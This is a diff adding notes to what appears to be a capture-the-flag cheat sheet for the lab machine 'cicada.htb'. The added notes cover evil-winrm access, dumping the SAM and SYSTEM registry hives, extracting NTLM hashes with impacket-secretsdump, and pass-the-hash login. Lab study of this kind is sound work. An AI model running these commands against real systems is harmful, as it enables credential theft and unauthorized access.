@@ -474,3 +474,44 @@ users
 ```
 evil-winrm -u <username> -p '' -i cicada.htb
 ```
+
+
+
+## W﻿indows Privelege Escalation
+
+```
+whoami /priv
+```
+
+
+
+## W﻿indows Registry (Password NTLM hashes)
+
+\
+(﻿use these commands while in Evil-winrm)
+
+```
+reg save hklm\sam sam
+reg save hklm\system system
+```
+
+
+
+## B﻿ruteForcing Windows Passwords
+
+(﻿Using the files from the registry, we can try to pull the hashes)
+
+```
+impacket-secretsdump -sam sam -system system local
+
+```
+
+
+
+## P﻿ass the Hash, Windows
+
+
+
+```
+evil-winrm -u <username> -H <hash> -i cicada.htb
+```
